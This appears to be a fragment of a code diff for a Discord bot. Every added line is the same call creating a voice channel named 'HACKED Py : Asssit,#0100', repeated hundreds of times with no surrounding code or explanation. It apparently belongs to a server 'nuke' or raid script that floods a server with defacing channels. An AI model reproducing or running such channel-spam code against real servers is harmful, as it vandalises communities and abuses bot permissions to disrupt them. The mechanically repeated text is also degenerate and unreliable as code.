+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
